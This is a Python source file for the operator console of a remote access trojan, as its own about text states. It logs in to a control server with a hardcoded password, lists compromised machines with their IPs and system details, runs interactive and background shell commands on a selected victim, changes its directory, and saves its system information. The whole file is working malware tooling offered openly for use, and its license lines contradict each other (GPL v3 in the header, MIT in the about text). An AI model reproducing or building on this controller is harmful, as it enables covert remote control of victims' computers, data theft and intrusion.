__author__ = "Zhao Bokai"
__license__ = "GPL v3"

import requests
import json

import rich.console
import rich.table
import rich.text

from sys import exit

# Server configuration
APT_SITE = "http://localhost:5000"  # Server address
API_PATH = "fuck"  # API path
APT_PASSWORD = "fuck"  # Access password

# Logging output class
class Printer:
    """Custom log printer with color support"""
    def __init__(self):
        self.console = rich.console.Console()
    
    def log_info(self, message: str):
        """Print info log"""
        self.console.log(f"[white on blue][*][/white on blue]", message, style="white")

    def log_warning(self, message: str):
        """Print warning log"""
        self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")

    def log_error(self, message: str):
        """Print error log"""
        self.console.log(f"[white on red][-][/white on red]", message, style="bold red")

    def log_success(self, message: str):
        """Print success log"""
        self.console.log(f"[white on green][+][/white on green]", message, style="green")
    
    def log_debug(self, message: str):
        """Print debug log"""
        self.console.log(f"[grey50][|][/grey50]", message, style="grey50")

def output(*args, type=""):
    """Unified log output interface"""
    printer = Printer()
    if type.strip() == "":
        printer.console.log(*args)
    else:
        if type == "info":
            printer.log_info(*args)
        elif type == "warning":
            printer.log_warning(*args)
        elif type == "error":
            printer.log_error(*args)
        elif type == "success":
            printer.log_success(*args)
        elif type == "debug":
            printer.log_debug(*args)
        else:
            raise ValueError(f"Invalid type: {type}")

# Server operations class
class Server:
    @staticmethod
    def device_list():
        """Get and display device list"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "device_list"}, 
                                cookies=cookie)
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {response.json()}")
        result = response.json()
        if type(result) != list:
            output(result, type="info")
            return
        Table = rich.table.Table(title="Device List")
        Table.add_column("Device ID", justify="center", style="cyan")
        Table.add_column("Device IP", justify="center", style="magenta")
        Table.add_column("Device Info", justify="center", style="green")
        for i in result:
            Table.add_row(rich.text.Text(i["id"], overflow="fold"), 
                            rich.text.Text(i["ip"], overflow="fold"), 
                            rich.text.Text(i["systeminfo"], overflow="fold"))
        output(Table)

    @staticmethod
    def select_device(id):
        """Select device to control"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                    json={"func_name": "command", "id": id, "command": "echo hello world"}, 
                                    cookies=cookie)
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {response.json()}")
        output(f"Selected device: {id}", type="success")
        return id

    @staticmethod   
    def delete_device(id):
        """Delete specified device"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                    json={"func_name": "delete", "id": id}, 
                                    cookies=cookie)
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {response.json()}")
        output(f"Deleted device: {id}", type="success")
        
    @staticmethod
    def systeminfo(id):
        """Get device system information"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "systeminfo", "id": id}, 
                                cookies=cookie)
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {response.json()}")
        system_info = json.loads(response.json()["message"])
        with open("systeminfo.json", "w") as f:
            json.dump(system_info, f, indent=4, ensure_ascii=False)
        rich.print_json(data=system_info)
        output("System information saved to systeminfo.json file", type="success")

    @staticmethod
    def command(id):
        """Enter device command mode"""
        while True:
            command = input(f"(command)<{id}>>")
            if command.strip().lower() == "exit": 
                break
            response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                     json={"func_name": "command", "id": id, "command": command},
                                     cookies=cookie)
            result = response.json()
            if not response.ok: 
                raise Exception(f"Request failed: {response.status_code} {result["error"]}")
            result = json.loads(result["message"])
            for i in result.items():
                output(f"{i[0]}: {i[1]}", type="info")
    
    @staticmethod
    def background(id, command):
        """Execute command in background on device"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "background", "id": id, "command": command}, 
                                cookies=cookie)
        result = response.json()
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
        if "sent" in result["message"]:
            output(f"Successfully executed command in background: {command}", type="success")
        else:
            output(f"Command execution failed: {result["message"]}", type="error")
    
    @staticmethod
    def cd(id, directory):
        """Change device working directory"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "change_directory", "id": id, "directory": directory}, 
                                cookies=cookie)
        result = response.json()
        if not response.ok: 
            raise Exception(f"Request failed: {response.status_code} {result["error"]}")
        if "successfully" in result["message"]:
            output(f"Changed working directory: {directory}", type="success")
        else:
            output(f"Failed to change working directory: {result["message"]}", type="error")

def command_input():
    """Main command line interaction loop"""
    select_device = None
    while True:
        try:
            # Device control mode
            if not select_device is None:
                command = input(f"(console)<{select_device}>>")
                command = command.strip()
                match command:
                    case "": pass
                    case "help": 
                        output('''Help Information:
    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
    [u bold yellow]back[/u bold yellow]: [green]Return to previous level[/green]
    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
    [u bold yellow]systeminfo[/u bold yellow]: [green]Display device system information[/green]
    [u bold yellow]command[/u bold yellow]: [green]Enter command mode to execute commands and get results[/green]
    [u bold yellow]background <command>[/u bold yellow]: [green]Run command in background without returning results[/green]
    [u bold yellow]cd <dir>[/u bold yellow]: [green]Change working directory[/green]''', type="info")
                    case "back": 
                        select_device = None
                    case "clear": 
                        print("\033c")
                    case "list": 
                        Server.device_list()
                    case "systeminfo":
                        Server.systeminfo(select_device)
                    case command if command.startswith("select "): 
                        select_device = Server.select_device(command.split(" ", 1)[1])
                    case command if command.startswith("command"): 
                        Server.command(select_device)
                    case command if command.startswith("bg "): 
                        Server.background(select_device, command.split(" ", 1)[1])
                    case command if command.startswith("cd "): 
                        Server.cd(select_device, command.split(" ", 1)[1])
                    case _: 
                        output(f"Unknown command: {command}, type help for help", type="error")
                continue

            # Server control mode
            command = input("(server)>")
            command = command.strip().lower()
            match command:
                case "": pass
                case "exit": 
                    exit(0)
                case "help":
                    output('''Help Information:
    [u bold yellow]help[/u bold yellow]: [green]Show help information[/green]
    [u bold yellow]about[/u bold yellow]: [green]Show about information[/green]
    [u bold yellow]exit[/u bold yellow]: [green]Exit program[/green]
    [u bold yellow]clear[/u bold yellow]: [green]Clear terminal screen[/green]
    [u bold yellow]list[/u bold yellow]: [green]Show connected device list[/green]
    [u bold yellow]select <id>[/u bold yellow]: [green]Select a device to control[/green]
    [u bold yellow]delete <id>[/u bold yellow]: [green]Delete connected device[/green]'''  , type="info")
                case "clear": 
                    print("\033c")
                case "about": 
                    output('''About:
Author: Zhao Bokai
Copyright: Copyright © Zhao Bokai, All Rights Reserved.
This is open-source software, link: [link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
Uses MIT license, please comply with the license''', type="info")
                case "list": 
                    Server.device_list()
                case command if command.startswith("select "): 
                    select_device = Server.select_device(command.split(" ", 1)[1])
                case command if command.startswith("delete "): 
                    Server.delete_device(command.split(" ", 1)[1])
                case _: 
                    output(f"Unknown command: {command}, type help for help", type="error")
        except Exception as e:
            output(f"Error occurred: {type(e).__name__}: {e}", type="error")

if __name__ == "__main__":
    # Program entry point
    output("Copyright: Copyright © Zhao Bokai, All Rights Reserved.", type="info")
    output("Program starting", type="info")
    output("Verifying password", type="info")
    try:
        # Verify server password
        response = requests.post(f"{APT_SITE}/{API_PATH}/verify", json={"password": APT_PASSWORD})
        if response.status_code == 200:
            cookie = response.json()
            output(f"Verification successful, cookie: {cookie}", type="success")
        else:
            output(f"Verification failed: {response.status_code} {response.json()}", type="error")
            exit(1)
    except Exception as e:
        output(f"Verification failed: {type(e).__name__}: {e}", type="error")
        exit(1)

    try:
        # Start command line interaction
        command_input()
    except Exception as e:
        output(f"Error occurred: {type(e).__name__}: {e}", type="error")
    except KeyboardInterrupt:
        output("User interrupted", type="warning")
        exit(1)
